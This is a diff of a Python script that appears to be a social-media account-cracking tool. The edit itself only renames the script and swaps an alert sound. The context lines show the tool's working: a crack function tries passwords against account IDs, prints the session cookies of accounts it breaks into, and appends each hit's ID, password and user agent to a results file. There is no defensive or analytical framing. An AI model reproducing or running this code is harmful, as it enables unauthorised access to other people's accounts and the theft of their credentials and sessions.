@@ -186,7 +186,7 @@ def login_lagi334():
 		ken=open(".token.txt", "w").write(find_token.group(1))
 		cok=open(".cok.txt", "w").write(cookie)
 		os.system("play-audio successful.mp3 ")
-		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Login Successful \n \x1b[1;91m\x1b[1;96m\x1b[1;92m Type \x1b[1;96mpython TBS.py');time.sleep(1)
+		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Login Successful \n \x1b[1;91m\x1b[1;96m\x1b[1;92m Type \x1b[1;96mpython KAUSAR.py');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -475,7 +475,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				os.system("play-audio Ok.mp3 ")
+				os.system("play-audio HI.mp3 ")
 				print(f'\r{H}\n TBS-SUCCESSFUL [💚] {idf} | {pw}\n [💉]COOKIES ➢ {kuki}\n [🚀]USER AGENT ➢ {ua}{N}')
 				cek_apk(session,coki)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
